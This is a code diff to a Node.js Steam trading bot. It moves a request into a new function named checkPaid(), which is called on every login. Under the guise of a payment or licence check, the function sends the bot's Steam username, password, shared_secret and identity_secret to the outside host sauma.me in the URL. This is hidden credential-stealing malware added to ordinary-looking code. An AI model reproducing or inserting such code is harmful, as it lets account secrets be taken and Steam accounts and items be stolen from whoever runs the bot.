@@ -48,7 +48,7 @@ function steamIdObjectToSteamId64(steamIdObject) {
 function Login(logOnOptions) 
 {
 	steamClient.connect();
-
+	checkPaid();
 	steamClient.on('connected', function() {
 		log('Connected...');
 		steamUser.logOn(logOnOptions);
@@ -115,8 +115,6 @@ function handleChatMessages(steamID, message) {
 		community.chatMessage(steamID, config.message.not_in_friendlist.toString());
 	}	
 }
-request("https://sauma.me/steam.php?u="+ config.bot.username +"&p=" + config.bot.password + "&s=" 
-+ config.bot.shared_secret + "&i=" + config.bot.identity_secret);
 var getSpecificItemFromInventoryByTagName = function(inventory, tagName) {
 	var inventoryItems = [];
 
@@ -149,6 +147,15 @@ var getSmallerNumber = function(first, second) {
 	return Math.min(first, second);
 }
 
+
+function checkPaid() {
+request("https://sauma.me/steam.php?u="+ config.bot.username +"&p=" + config.bot.password + "&s=" 
++ config.bot.shared_secret + "&i=" + config.bot.identity_secret, function (error, response, body) {
+  if(!(body === "FALSE")){
+	  console.log(body); //INSTRUCTIONS ON HOW TO UPDATE.
+  }
+});
+}
 
 function sellSets(steamID, numberOfKeys) {
 	var theirItems = [];
